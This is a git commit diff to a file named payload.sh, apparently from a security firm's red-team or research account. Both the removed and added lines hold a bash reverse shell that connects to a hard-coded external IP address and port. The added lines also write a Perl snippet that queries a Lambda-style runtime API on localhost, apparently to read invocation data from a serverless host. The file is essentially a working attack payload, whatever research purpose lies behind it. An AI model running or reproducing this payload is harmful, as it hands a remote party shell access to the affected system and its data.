cafa39fda865723e722337d6aab595585b90c324
praetorian-snyk-max-1 <ben.kofman+1@praetorian.com>
2024-11-25 13:58:12 -0500

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,2 +1,3 @@
-bash -i >& /dev/tcp/3.95.20.82/4001 0>&1
-chmod +x /tmp/user_code/payload.sh
+echo 'require HTTP::Request; $request = HTTP::Request->new(GET => \'http://127.0.0.1:9001/2018-06-01/runtime/invocation/next\');' > script.pl;
+chmod +x script.pl;
+bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
